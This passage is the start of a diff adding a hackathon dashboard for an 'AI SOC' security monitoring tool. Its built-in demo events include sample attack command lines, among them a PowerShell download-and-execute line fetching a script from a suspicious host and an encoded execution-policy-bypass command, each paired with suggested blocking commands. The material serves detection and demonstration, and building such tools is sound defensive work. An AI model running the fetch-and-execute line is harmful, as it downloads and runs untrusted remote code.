@@ -1,0 +1,862 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🛡️ AI SOC Command Center</title>
+<style>
+  :root {
+    --bg: #0b1220;
+    --card1: #0e1b2c;
+    --card2: #16283f;
+    --border: #23415f;
+    --text: #ffffff;
+    --muted: #8fb3d9;
+    --dim: #7d97b6;
+    --critical: #ff4b4b;
+    --high: #ffa421;
+    --medium: #ffe312;
+    --low: #00d46a;
+    --accent: #3a86ff;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    background:
+      radial-gradient(1200px 500px at 80% -10%, rgba(58,134,255,0.14), transparent 60%),
+      radial-gradient(900px 400px at 10% 110%, rgba(114,9,183,0.12), transparent 60%),
+      var(--bg);
+    color: var(--text);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    min-height: 100vh;
+    padding-bottom: 60px;
+  }
+
+  /* ── Header ─────────────────────────────────────── */
+  header {
+    display: flex; align-items: center; justify-content: space-between;
+    flex-wrap: wrap; gap: 14px;
+    padding: 26px 36px 10px;
+  }
+  .hero-title { font-size: 1.75rem; font-weight: 800; letter-spacing: -0.02em; }
+  .hero-sub { color: var(--muted); font-size: 0.92rem; margin-top: 5px; }
+  .header-right { display: flex; align-items: center; gap: 12px; }
+  .live-pill {
+    display: inline-flex; align-items: center;
+    background: rgba(0,212,106,0.12); border: 1px solid rgba(0,212,106,0.35);
+    color: var(--low); padding: 8px 16px; border-radius: 999px;
+    font-size: 0.8rem; font-weight: 700; letter-spacing: 0.03em;
+  }
+  .live-dot {
+    width: 9px; height: 9px; border-radius: 50%; background: var(--low);
+    margin-right: 9px; animation: pulse 1.6s infinite;
+  }
+  @keyframes pulse {
+    0% { box-shadow: 0 0 0 0 rgba(0,212,106,0.55); }
+    70% { box-shadow: 0 0 0 9px rgba(0,212,106,0); }
+    100% { box-shadow: 0 0 0 0 rgba(0,212,106,0); }
+  }
+  .clock { color: var(--dim); font-size: 0.82rem; font-variant-numeric: tabular-nums; }
+  .gear-btn {
+    background: var(--card1); border: 1px solid var(--border); color: var(--muted);
+    border-radius: 10px; padding: 9px 14px; cursor: pointer; font-size: 0.85rem;
+  }
+  .gear-btn:hover { border-color: var(--accent); color: var(--text); }
+
+  /* ── Settings panel ─────────────────────────────── */
+  #settingsPanel {
+    display: none; margin: 8px 36px 0; padding: 16px 20px;
+    background: var(--card1); border: 1px solid var(--border); border-radius: 14px;
+  }
+  #settingsPanel.open { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; }
+  #settingsPanel input {
+    flex: 1; min-width: 240px; background: var(--bg); color: var(--text);
+    border: 1px solid var(--border); border-radius: 9px; padding: 10px 12px; font-size: 0.88rem;
+  }
+  .btn {
+    background: var(--accent); border: none; color: #fff; font-weight: 700;
+    padding: 10px 18px; border-radius: 9px; cursor: pointer; font-size: 0.85rem;
+  }
+  .btn:hover { filter: brightness(1.12); }
+  .btn-ghost { background: transparent; border: 1px solid var(--border); color: var(--muted); }
+
+  /* ── Demo banner ────────────────────────────────── */
+  #demoBanner {
+    margin: 12px 36px 0; padding: 10px 18px; border-radius: 11px;
+    background: rgba(255,164,33,0.08); border: 1px solid rgba(255,164,33,0.3);
+    color: var(--high); font-size: 0.83rem;
+  }
+
+  /* ── Tabs ───────────────────────────────────────── */
+  nav {
+    display: flex; gap: 8px; padding: 22px 36px 6px; flex-wrap: wrap;
+  }
+  .tab-btn {
+    background: transparent; border: 1px solid transparent; color: var(--muted);
+    padding: 11px 22px; border-radius: 11px; cursor: pointer;
+    font-size: 0.92rem; font-weight: 700;
+  }
+  .tab-btn:hover { color: var(--text); background: rgba(255,255,255,0.04); }
+  .tab-btn.active {
+    background: linear-gradient(135deg, var(--card1), var(--card2));
+    border-color: var(--border); color: var(--text);
+    box-shadow: 0 4px 18px rgba(0,0,0,0.25);
+  }
+
+  main { padding: 10px 36px; }
+  .tab-page { display: none; animation: fadeIn 0.28s ease; }
+  .tab-page.active { display: block; }
+  @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: none; } }
+
+  /* ── KPI cards ──────────────────────────────────── */
+  .kpi-grid {
+    display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+    gap: 16px; margin: 14px 0 22px;
+  }
+  .kpi {
+    background: linear-gradient(135deg, var(--card1) 0%, var(--card2) 100%);
+    border: 1px solid var(--border); border-radius: 15px;
+    padding: 20px 22px 16px; transition: transform 0.18s ease, box-shadow 0.18s ease;
+  }
+  .kpi:hover { transform: translateY(-3px); box-shadow: 0 12px 28px rgba(0,0,0,0.35); }
+  .kpi-label { color: var(--muted); font-size: 0.76rem; letter-spacing: 0.06em; font-weight: 700; }
+  .kpi-value { font-size: 2.05rem; font-weight: 800; margin: 8px 0 4px; letter-spacing: -0.02em; }
+  .kpi-value.small { font-size: 1.35rem; margin-top: 13px; }
+  .kpi-sub { color: var(--dim); font-size: 0.76rem; }
+
+  /* ── Charts ─────────────────────────────────────── */
+  .charts {
+    display: grid; grid-template-columns: 1fr 1.2fr; gap: 16px; margin-bottom: 22px;
+  }
+  @media (max-width: 980px) { .charts { grid-template-columns: 1fr; } }
+  .panel {
+    background: linear-gradient(135deg, var(--card1) 0%, var(--card2) 100%);
+    border: 1px solid var(--border); border-radius: 15px; padding: 22px;
+  }
+  .panel h3 { font-size: 1.02rem; margin-bottom: 4px; }
+  .panel .cap { color: var(--dim); font-size: 0.78rem; margin-bottom: 16px; }
+
+  .donut-wrap { display: flex; align-items: center; gap: 26px; flex-wrap: wrap; }
+  .donut-center-total { font-size: 1.65rem; font-weight: 800; }
+  .donut-center-label { font-size: 0.68rem; fill: var(--dim); }
+  .legend { display: flex; flex-direction: column; gap: 10px; }
+  .legend-row { display: flex; align-items: center; gap: 10px; font-size: 0.86rem; }
+  .dot { width: 11px; height: 11px; border-radius: 50%; flex-shrink: 0; }
+  .legend-row .n { margin-left: auto; color: var(--muted); font-weight: 700; font-variant-numeric: tabular-nums; }
+
+  .bar-row { display: grid; grid-template-columns: 130px 1fr 46px; align-items: center; gap: 12px; margin: 11px 0; }
+  .bar-name { font-size: 0.82rem; color: var(--muted); text-align: right; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .bar-track { background: rgba(255,255,255,0.06); border-radius: 8px; height: 13px; overflow: hidden; }
+  .bar-fill {
+    height: 100%; border-radius: 8px;
+    background: linear-gradient(90deg, var(--accent), #8338ec);
+    transition: width 0.7s cubic-bezier(0.2, 0.7, 0.3, 1);
+  }
+  .bar-count { font-size: 0.82rem; color: var(--muted); font-weight: 700; font-variant-numeric: tabular-nums; }
+
+  /* ── Feed ───────────────────────────────────────── */
+  .feed-row {
+    display: flex; align-items: center; gap: 14px;
+    padding: 11px 6px; border-bottom: 1px solid rgba(35,65,95,0.5);
+  }
+  .feed-row:last-child { border-bottom: none; }
+  .feed-text { flex: 1; font-size: 0.89rem; color: #d7e4f3; line-height: 1.45; }
+  .feed-text b { color: var(--text); }
+  .feed-meta { color: var(--dim); font-size: 0.74rem; white-space: nowrap; }
+
+  .chip {
+    display: inline-block; padding: 3px 13px; border-radius: 999px;
+    font-size: 0.71rem; font-weight: 800; letter-spacing: 0.05em; white-space: nowrap;
+  }
+  .chip-critical { background: var(--critical); color: #2b0000; }
+  .chip-high     { background: var(--high); color: #3a2000; }
+  .chip-medium   { background: var(--medium); color: #3a3000; }
+  .chip-low      { background: var(--low); color: #003318; }
+
+  .explainer {
+    margin: 22px 0 8px; padding: 16px 20px; border-radius: 13px;
+    background: rgba(58,134,255,0.08); border: 1px solid rgba(58,134,255,0.22);
+    color: var(--muted); font-size: 0.88rem; line-height: 1.6;
+  }
+
+  /* ── Investigation ──────────────────────────────── */
+  .invest-grid { display: grid; grid-template-columns: 340px 1fr; gap: 16px; }
+  @media (max-width: 980px) { .invest-grid { grid-template-columns: 1fr; } }
+  .event-list { max-height: 640px; overflow-y: auto; padding-right: 6px; }
+  .event-list::-webkit-scrollbar { width: 8px; }
+  .event-list::-webkit-scrollbar-thumb { background: var(--border); border-radius: 8px; }
+  .event-item {
+    width: 100%; text-align: left; cursor: pointer;
+    background: rgba(255,255,255,0.025); border: 1px solid transparent;
+    border-radius: 11px; padding: 12px 14px; margin-bottom: 9px; color: var(--text);
+    transition: border-color 0.15s ease, background 0.15s ease;
+  }
+  .event-item:hover { background: rgba(255,255,255,0.05); }
+  .event-item.selected { border-color: var(--accent); background: rgba(58,134,255,0.10); }
+  .event-item .idline { display: flex; align-items: center; gap: 8px; margin-bottom: 5px; }
+  .event-item .sum { font-size: 0.78rem; color: var(--muted); line-height: 1.4; }
+
+  .detail-block h4 { font-size: 0.95rem; margin-bottom: 12px; }
+  .metric-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 16px; }
+  .metric {
+    background: rgba(255,255,255,0.035); border: 1px solid var(--border);
+    border-radius: 11px; padding: 11px 13px;
+  }
+  .metric .m-label { color: var(--dim); font-size: 0.68rem; letter-spacing: 0.05em; font-weight: 700; }
+  .metric .m-value { font-size: 0.92rem; font-weight: 800; margin-top: 4px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+
+  .summary-big { font-size: 1.02rem; line-height: 1.6; color: #d7e4f3; margin-bottom: 16px; }
+  .summary-big b { color: var(--text); }
+
+  .risk-track { background: rgba(255,255,255,0.08); height: 13px; border-radius: 8px; overflow: hidden; margin: 8px 0 5px; }
+  .risk-fill { height: 100%; border-radius: 8px; transition: width 0.6s ease; }
+  .cap-small { color: var(--dim); font-size: 0.76rem; margin-bottom: 14px; }
+
+  .mitre-box, .reason-box, .fix-box {
+    border-radius: 11px; padding: 13px 15px; margin-bottom: 13px; font-size: 0.86rem; line-height: 1.55;
+  }
+  .mitre-box  { background: rgba(114,9,183,0.12); border: 1px solid rgba(114,9,183,0.3); }
+  .reason-box { background: rgba(58,134,255,0.08); border: 1px solid rgba(58,134,255,0.22); color: #cfe0f2; }
+  .fix-box    { background: rgba(255,75,75,0.07); border: 1px solid rgba(255,75,75,0.25); }
+
+  .cmd {
+    position: relative; background: #08101c; border: 1px solid var(--border);
+    border-radius: 10px; padding: 13px 52px 13px 15px; margin-top: 10px;
+    font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
+    font-size: 0.8rem; color: #9fe8ff; white-space: pre-wrap; word-break: break-all; line-height: 1.55;
+  }
+  .copy-btn {
+    position: absolute; top: 9px; right: 9px;
+    background: rgba(255,255,255,0.08); border: 1px solid var(--border);
+    color: var(--muted); border-radius: 7px; padding: 5px 10px; cursor: pointer; font-size: 0.72rem;
+  }
+  .copy-btn:hover { color: var(--text); border-color: var(--accent); }
+
+  details.raw { margin-top: 4px; }
+  details.raw summary {
+    cursor: pointer; color: var(--muted); font-size: 0.83rem; font-weight: 700;
+    padding: 10px 0; list-style: none;
+  }
+  details.raw summary::before { content: "▸ "; }
+  details.raw[open] summary::before { content: "▾ "; }
+
+  .pending-pill {
+    display: inline-block; background: rgba(255,227,18,0.1); border: 1px solid rgba(255,227,18,0.3);
+    color: var(--medium); border-radius: 9px; padding: 8px 14px; font-size: 0.82rem; margin-bottom: 13px;
+  }
+
+  /* ── Reports ────────────────────────────────────── */
+  .reports-grid { display: grid; grid-template-columns: 1.2fr 1fr; gap: 16px; }
+  @media (max-width: 980px) { .reports-grid { grid-template-columns: 1fr; } }
+  .checklist { list-style: none; margin: 10px 0 20px; }
+  .checklist li { padding: 8px 0; font-size: 0.92rem; color: #d7e4f3; }
+  .checklist li::before { content: "✅ "; }
+  table.rep { width: 100%; border-collapse: collapse; font-size: 0.88rem; }
+  table.rep th, table.rep td { text-align: left; padding: 11px 13px; border-bottom: 1px solid var(--border); }
+  table.rep th { color: var(--dim); font-size: 0.72rem; letter-spacing: 0.06em; }
+  .big-btn {
+    background: linear-gradient(135deg, var(--accent), #8338ec); border: none; color: #fff;
+    padding: 16px 26px; border-radius: 13px; cursor: pointer; font-size: 1rem; font-weight: 800;
+    box-shadow: 0 10px 26px rgba(58,134,255,0.3);
+  }
+  .big-btn:hover { filter: brightness(1.13); transform: translateY(-2px); transition: 0.15s; }
+
+  footer {
+    text-align: center; color: var(--dim); font-size: 0.78rem;
+    margin-top: 46px; line-height: 1.8;
+  }
+  .col-accent { color: var(--accent); font-weight: 700; }
+</style>
+</head>
+<body>
+
+<header>
+  <div>
+    <div class="hero-title">🛡️ Autonomous Security Operations Center</div>
+    <div class="hero-sub">AI watches every event, ranks the danger, and writes the fix — automatically, 24/7.</div>
+  </div>
+  <div class="header-right">
+    <div class="clock" id="clock">--:--:--</div>
+    <div class="live-pill"><span class="live-dot"></span>SYSTEM ACTIVE — LIVE</div>
+    <button class="gear-btn" onclick="toggleSettings()">⚙️ Settings</button>
+  </div>
+</header>
+
+<div id="settingsPanel">
+  <span style="color:var(--muted);font-size:0.85rem;">API base URL:</span>
+  <input id="apiUrl" placeholder="http://localhost:8001" />
+  <button class="btn" onclick="connectApi()">🔌 Connect live data</button>
+  <button class="btn btn-ghost" onclick="useDemo()">Use demo data</button>
+</div>
+
+<div id="demoBanner">🎭 <b>Demo data mode</b> — showing built-in sample events. Open ⚙️ Settings to connect your live API.</div>
+
+<nav>
+  <button class="tab-btn active" data-tab="overview" onclick="switchTab('overview')">📊 Overview</button>
+  <button class="tab-btn" data-tab="investigation" onclick="switchTab('investigation')">🔍 Investigation</button>
+  <button class="tab-btn" data-tab="reports" onclick="switchTab('reports')">📑 Reports</button>
+</nav>
+
+<main>
+  <!-- ═══════════ OVERVIEW ═══════════ -->
+  <section class="tab-page active" id="tab-overview">
+    <div class="kpi-grid" id="kpiGrid"></div>
+
+    <div class="charts">
+      <div class="panel">
+        <h3>🎚️ How dangerous are the events?</h3>
+        <div class="cap">AI-assessed threat levels across all monitored activity</div>
+        <div class="donut-wrap">
+          <svg width="190" height="190" viewBox="0 0 190 190" id="donutSvg"></svg>
+          <div class="legend" id="donutLegend"></div>
+        </div>
+      </div>
+      <div class="panel">
+        <h3>🏠 Which machines are under attack?</h3>
+        <div class="cap">The actual places being targeted — not just the operating system</div>
+        <div id="machineBars"></div>
+      </div>
+    </div>
+
+    <div class="panel">
+      <h3>⚡ Live attack feed</h3>
+      <div class="cap">The latest security events, translated into plain language. Seeing similar lines repeat is normal — a brute-force attack produces dozens of near-identical login attempts by design.</div>
+      <div id="feed"></div>
+    </div>
+
+    <div class="explainer">
+      🧠 <b>How it works:</b> 1️⃣ the AI reads every event &nbsp;→&nbsp; 2️⃣ scores how dangerous it is &nbsp;→&nbsp; 3️⃣ writes the exact command to stop it.
+      Open the <b>🔍 Investigation</b> tab to see the full reasoning behind any event.
+    </div>
+  </section>
+
+  <!-- ═══════════ INVESTIGATION ═══════════ -->
+  <section class="tab-page" id="tab-investigation">
+    <div class="invest-grid">
+      <div class="panel">
+        <h3>📋 Events</h3>
+        <div class="cap">Select any event to investigate</div>
+        <div class="event-list" id="eventList"></div>
+      </div>
+      <div class="panel detail-block" id="detailPanel"></div>
+    </div>
+  </section>
+
+  <!-- ═══════════ REPORTS ═══════════ -->
+  <section class="tab-page" id="tab-reports">
+    <div class="reports-grid">
+      <div class="panel">
+        <h3>📑 Incident reports</h3>
+        <div class="cap">Export everything the system has seen and decided — ready for compliance, audits, or your incident review meeting.</div>
+        <ul class="checklist">
+          <li>Every monitored event with timestamps</li>
+          <li>AI threat level and risk score per event</li>
+          <li>The AI's reasoning for each verdict</li>
+          <li>The recommended remediation command</li>
+          <li>MITRE ATT&CK classification</li>
+        </ul>
+        <button class="big-btn" onclick="downloadCSV()">📥 Download full incident report (CSV)</button>
+      </div>
+      <div class="panel">
+        <h3>Report summary</h3>
+        <div class="cap">Event counts per threat level</div>
+        <table class="rep" id="reportTable"></table>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  🛡️ <span class="col-accent">Autonomous Agentic SOC SIEM</span> · built for Smart India Hackathon<br>
+  "LLM for judgment, rules for accountability."
+</footer>
+
+<script>
+/* ════════════════════════════════════════════════════════════
+   AI SOC Command Center — zero-dependency dashboard
+   ════════════════════════════════════════════════════════════ */
+
+const SEV_EMOJI = { critical: "🔴", high: "🟠", medium: "🟡", low: "🟢" };
+const SEV_ORDER = ["critical", "high", "medium", "low"];
+const SEV_COLORS = { critical: "#ff4b4b", high: "#ffa421", medium: "#ffe312", low: "#00d46a" };
+
+const MITRE_PLAIN = {
+  "T1110": "Brute-force password guessing",
+  "T1110.001": "Password guessing against one account",
+  "T1110.003": "Password spraying across many accounts",
+  "T1059": "Running scripted commands",
+  "T1059.001": "PowerShell abuse",
+  "T1078": "Using valid (possibly stolen) accounts",
+  "T1548": "Privilege escalation abuse",
+};
+
+const state = {
+  events: [],
+  live: false,
+  selected: null,
+  apiBase: localStorage.getItem("socApiBase") || "http://localhost:8001",
+};
+
+/* ── Demo dataset: realistic events with full AI verdicts ── */
+function mkEvent(o) {
+  const isWin = o.kind === "ps" || o.kind === "win";
+  let raw = o.raw || "";
+  if (!raw) {
+    if (o.kind === "fake")
+      raw = `${o.ts} ${o.host} sshd[4821]: Failed password for invalid user ${o.user} from ${o.ip} port ${o.port} ssh2`;
+    else if (o.kind === "fail")
+      raw = `${o.ts} ${o.host} sshd[2210]: Failed password for ${o.user} from ${o.ip} port ${o.port} ssh2`;
+    else if (o.kind === "success" || o.kind === "login")
+      raw = `${o.ts} ${o.host} sshd[1902]: Accepted password for ${o.user} from ${o.ip} port ${o.port} ssh2`;
+    else if (o.kind === "sudo")
+      raw = `${o.ts} ${o.host} sudo:     ${o.user} : TTY=pts/2 ; PWD=/home/${o.user} ; USER=root ; COMMAND=${o.cmd}`;
+    else if (o.kind === "ps")
+      raw = `{"UtcTime": "${o.ts}.000", "Computer": "${o.host}", "User": "${o.user}", "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe ${o.args}", "CommandLine": "${o.args}"}`;
+    else if (o.kind === "win")
+      raw = `{"UtcTime": "${o.ts}.000", "Computer": "${o.host}", "User": "${o.user}", "Image": "${o.proc}", "CommandLine": "${o.proc}"}`;
+  }
+  return {
+    id: o.id,
+    timestamp: o.ts,
+    log_source: isWin ? "windows-sysmon" : "linux-auth",
+    event_type: o.kind === "sudo" ? "privilege_escalation" : isWin ? "process_creation" : "authentication",
+    action: (o.kind === "fail" || o.kind === "fake") ? "failure" : o.kind === "sudo" ? "execute" : isWin ? "execute" : "success",
+    source_ip: o.ip || "—",
+    user: o.user,
+    host: o.host,
+    severity: o.baseSev,
+    threat_level: o.threat === undefined ? o.baseSev.toUpperCase() : o.threat,
+    mitre_technique: o.mitre || "",
+    risk_score: o.risk === undefined ? null : o.risk,
+    correlated_event_count: o.corr === undefined ? null : o.corr,
+    analysis_reasoning: o.reason || "",
+    response_actions: o.action || "",
+    raw_log: raw,
+  };
+}
+
+const A1 = "185.220.101.5", A2 = "45.147.229.11", A3 = "194.26.29.156", A4 = "91.240.118.172",
+      A5 = "61.177.173.35", A6 = "218.92.0.204", T1 = "10.0.0.5", T2 = "192.168.1.20";
+
+const DEMO_EVENTS = [
+  mkEvent({ id: 541, ts: "Oct 09 19:41:12", kind: "fail", ip: A2, user: "root", host: "web-prod-01", port: 41222,
+    baseSev: "medium", threat: "HIGH", mitre: "T1110.003 - Password Spraying", risk: 85, corr: 14,
+    reason: "Repeated failed SSH logins for 'root' from a known hostile IP, correlated with 14 similar attempts in the last hour — this is a coordinated brute-force campaign, not a typo.",
+    action: "**Analysis:** External brute-force against SSH on web-prod-01.\n**Remediation Command:**\n```bash\niptables -A INPUT -s 45.147.229.11 -p tcp --dport 22 -j DROP\niptables-save > /etc/iptables/rules.v4\n```" }),
+  mkEvent({ id: 540, ts: "Oct 09 19:41:05", kind: "ps", ip: "—", user: "CORP\\admin_user", host: "DC-CORP-01",
+    args: "-ExecutionPolicy Bypass -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA...",
+    baseSev: "low", threat: "CRITICAL", mitre: "T1059.001 - Command and Scripting Interpreter: PowerShell", risk: 95, corr: 3,
+    reason: "Encoded (hidden) PowerShell launched on a domain controller by an admin account at an unusual hour. Encoded commands are a classic malware trick to hide what is really running.",
+    action: "**Analysis:** Hidden PowerShell on DC-CORP-01 — likely post-exploitation.\n**Remediation Command:**\n```powershell\nStop-Process -Name powershell -Force\nNew-NetFirewallRule -DisplayName 'Block-PS-C2' -Direction Outbound -RemoteAddress 45.147.229.11 -Action Block\n```" }),
+  mkEvent({ id: 539, ts: "Oct 09 19:40:52", kind: "fake", ip: A4, user: "oracle", host: "db-primary-01", port: 52310,
+    baseSev: "high", threat: "HIGH", mitre: "T1110.003 - Password Spraying", risk: 80, corr: 9,
+    reason: "Login attempts using a username that does not exist on this machine — a signature of automated password-spraying tools scanning the network.",
+    action: "**Analysis:** Password spray against db-primary-01.\n**Remediation Command:**\n```bash\niptables -A INPUT -s 91.240.118.172 -j DROP\nufw deny from 91.240.118.172\n```" }),
+  mkEvent({ id: 538, ts: "Oct 09 19:40:31", kind: "success", ip: A5, user: "deploy", host: "jump-gateway", port: 33812,
+    baseSev: "low", threat: "HIGH", mitre: "T1078 - Valid Accounts", risk: 90, corr: 11,
+    reason: "Successful login from an attacker IP immediately after a burst of failed attempts against the same account — the brute-force likely SUCCEEDED. Treat this account as compromised.",
+    action: "**Analysis:** Probable account compromise on jump-gateway.\n**Remediation Command:**\n```bash\npasswd -l deploy\niptables -A INPUT -s 61.177.173.35 -j DROP\nlast -20 | grep deploy\n```" }),
+  mkEvent({ id: 537, ts: "Oct 09 19:40:20", kind: "sudo", ip: "—", user: "deploy", host: "jump-gateway", cmd: "/bin/bash",
+    baseSev: "medium", threat: "MEDIUM", mitre: "T1548 - Abuse Elevation Control Mechanism", risk: 65, corr: 4,
+    reason: "A service account opened a full admin shell. Service accounts should never need interactive root access — this may be an attacker consolidating control.",
+    action: "**Analysis:** Suspicious privilege escalation on jump-gateway.\n**Remediation Command:**\n```bash\n# Review and restrict sudo rights\nsudo -l -U deploy\ngpasswd -d deploy sudo\n```" }),
+  mkEvent({ id: 536, ts: "Oct 09 19:40:02", kind: "fail", ip: A1, user: "admin", host: "web-prod-02", port: 44821,
+    baseSev: "medium", threat: "MEDIUM", mitre: "T1110 - Brute Force", risk: 55, corr: 6,
+    reason: "Failed SSH login for 'admin' from a suspicious IP. Part of a small cluster of attempts — worth watching but not yet critical.",
+    action: "**Analysis:** Early-stage brute-force on web-prod-02.\n**Remediation Command:**\n```bash\niptables -A INPUT -s 185.220.101.5 -p tcp --dport 22 -j DROP\n```" }),
+  mkEvent({ id: 535, ts: "Oct 09 19:39:47", kind: "fake", ip: A3, user: "ftpuser", host: "mail-relay-01", port: 61002,
+    baseSev: "high", threat: "MEDIUM", mitre: "T1110 - Brute Force", risk: 50, corr: 5,
+    reason: "Fake username probe from a foreign IP — automated scanner behavior against the mail relay.",
+    action: "**Analysis:** Scanner probing mail-relay-01.\n**Remediation Command:**\n```bash\niptables -A INPUT -s 194.26.29.156 -j DROP\n```" }),
+  mkEvent({ id: 534, ts: "Oct 09 19:39:31", kind: "ps", ip: "—", user: "NT AUTHORITY\\SYSTEM", host: "WORKSTATION-HR",
+    args: "-w hidden -c Get-Process | Where-Object {$_.CPU -gt 100}",
+    baseSev: "low", threat: "MEDIUM", mitre: "T1059.001 - PowerShell abuse", risk: 60, corr: 2,
+    reason: "Hidden PowerShell window doing process reconnaissance on an HR workstation — matches the early stage of a ransomware playbook.",
+    action: "**Analysis:** Suspicious hidden PowerShell on WORKSTATION-HR.\n**Remediation Command:**\n```powershell\nStop-Process -Name powershell -Force\nGet-WinEvent -LogName Security -MaxEvents 50\n```" }),
+  mkEvent({ id: 533, ts: "Oct 09 19:39:12", kind: "fail", ip: A6, user: "postgres", host: "db-primary-01", port: 30122,
+    baseSev: "medium", threat: "MEDIUM", mitre: "T1110 - Brute Force", risk: 55, corr: 7,
+    reason: "Failed login for the database account 'postgres' from a suspicious IP — attackers prize this account because it controls data.",
+    action: "**Analysis:** Brute-force at the database server.\n**Remediation Command:**\n```bash\niptables -A INPUT -s 218.92.0.204 -p tcp --dport 22 -j DROP\n```" }),
+  mkEvent({ id: 532, ts: "Oct 09 19:38:58", kind: "login", ip: T1, user: "ubuntu", host: "app-stage-03", port: 51220,
+    baseSev: "low", threat: "LOW", mitre: "", risk: 10, corr: 0,
+    reason: "Normal administrative login from a trusted internal address during working hours. Nothing suspicious.", action: "N/A - Event evaluated as non-suspicious." }),
+  mkEvent({ id: 531, ts: "Oct 09 19:38:44", kind: "win", ip: "—", user: "CORP\\hr_user", host: "WORKSTATION-HR", proc: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    baseSev: "low", threat: "LOW", mitre: "", risk: 5, corr: 0,
+    reason: "Routine web browsing activity on an HR workstation. Benign.", action: "N/A - Event evaluated as non-suspicious." }),
+  mkEvent({ id: 530, ts: "Oct 09 19:38:20", kind: "fail", ip: A2, user: "ubuntu", host: "web-prod-01", port: 40112,
+    baseSev: "medium", threat: "MEDIUM", mitre: "T1110 - Brute Force", risk: 55, corr: 12,
+    reason: "Another failed SSH attempt from the same hostile IP already attacking web-prod-01 — same campaign.", action: "**Analysis:** Continued brute-force.\n**Remediation Command:**\n```bash\niptables -A INPUT -s 45.147.229.11 -p tcp --dport 22 -j DROP\n```" }),
+  mkEvent({ id: 529, ts: "Oct 09 19:38:02", kind: "sudo", ip: "—", user: "svc_backup", host: "db-primary-01", cmd: "/usr/bin/tail /var/log/auth.log",
+    baseSev: "medium", threat: "LOW", mitre: "", risk: 25, corr: 1,
+    reason: "Backup service reading auth logs — consistent with its maintenance role. Logged for audit only.", action: "N/A - no action needed." }),
+  mkEvent({ id: 528, ts: "Oct 09 19:37:45", kind: "ps", ip: "—", user: "DESKTOP\\local_admin", host: "LAPTOP-CEO",
+    args: "-c IEX (New-Object Net.WebClient).DownloadString('http://cdn-update.top/stage2.ps1')",
+    baseSev: "low", threat: "CRITICAL", mitre: "T1059.001 - PowerShell abuse", risk: 95, corr: 4,
+    reason: "PowerShell downloading and running a remote script on the CEO's laptop — classic malware staging. Highest priority: this machine holds sensitive data.",
+    action: "**Analysis:** Remote payload download on LAPTOP-CEO — likely malware.\n**Remediation Command:**\n```powershell\nStop-Process -Name powershell -Force\nNew-NetFirewallRule -DisplayName 'Block-C2' -Direction Outbound -RemoteAddress 0.0.0.0/0 -RemotePort 80 -Action Block\nRemove-Item C:\\Users\\Public\\payload.exe -Force\n```" }),
+  mkEvent({ id: 527, ts: "Oct 09 19:37:22", kind: "fake", ip: A6, user: "pi", host: "jump-gateway", port: 32001,
+    baseSev: "high", threat: "MEDIUM", mitre: "T1110 - Brute Force", risk: 50, corr: 8,
+    reason: "Default-credential probe ('pi') — automated botnet scanning for Raspberry Pi devices left on the internet.", action: "**Analysis:** Botnet scanner.\n**Remediation Command:**\n```bash\niptables -A INPUT -s 218.92.0.204 -j DROP\n```" }),
+  mkEvent({ id: 526, ts: "Oct 09 19:37:08", kind: "success", ip: T2, user: "jenkins", host: "app-stage-03", port: 51002,
+    baseSev: "low", threat: "LOW", mitre: "", risk: 15, corr: 0,
+    reason: "Routine CI/CD service login from the internal network. Benign.", action: "N/A - Event evaluated as non-suspicious." }),
+  mkEvent({ id: 525, ts: "Oct 09 19:36:51", kind: "fail", ip: A1, user: "root", host: "mail-relay-01", port: 44122,
+    baseSev: "medium", threat: "MEDIUM", mitre: "T1110 - Brute Force", risk: 55, corr: 6,
+    reason: "Failed root login from a suspicious IP on the mail relay.", action: "**Analysis:** Brute-force on mail-relay-01.\n**Remediation Command:**\n```bash\niptables -A INPUT -s 185.220.101.5 -p tcp --dport 22 -j DROP\n```" }),
+  mkEvent({ id: 524, ts: "Oct 09 19:36:33", kind: "win", ip: "—", user: "NT AUTHORITY\\SYSTEM", host: "DC-CORP-01", proc: "C:\\Windows\\System32\\svchost.exe",
+    baseSev: "low", threat: "LOW", mitre: "", risk: 5, corr: 0,
+    reason: "Normal Windows service activity on the domain controller. Benign.", action: "N/A - Event evaluated as non-suspicious." }),
+  mkEvent({ id: 523, ts: "Oct 09 19:36:11", kind: "fake", ip: A4, user: "admin1", host: "web-prod-02", port: 33221,
+    baseSev: "high", threat: "MEDIUM", mitre: "T1110 - Brute Force", risk: 50, corr: 7,
+    reason: "Fake username probing from a hostile IP.", action: "**Analysis:** Scanner probing web-prod-02.\n**Remediation Command:**\n```bash\niptables -A INPUT -s 91.240.118.172 -j DROP\n```" }),
+  mkEvent({ id: 522, ts: "Oct 09 19:35:54", kind: "fail", ip: A3, user: "testuser", host: "app-stage-03", port: 60122,
+    baseSev: "medium", threat: "MEDIUM", mitre: "T1110 - Brute Force", risk: 55, corr: 5,
+    reason: "Failed login attempts against a staging server account.", action: "**Analysis:** Brute-force on app-stage-03.\n**Remediation Command:**\n```bash\niptables -A INPUT -s 194.26.29.156 -p tcp --dport 22 -j DROP\n```" }),
+  mkEvent({ id: 521, ts: "Oct 09 19:35:30", kind: "ps", ip: "—", user: "CORP\\admin_user", host: "SERVER-PROD-02",
+    args: "-c Get-WmiObject Win32_Process | Select-Object CommandLine",
+    baseSev: "low", threat: "MEDIUM", mitre: "T1059.001 - PowerShell abuse", risk: 60, corr: 2,
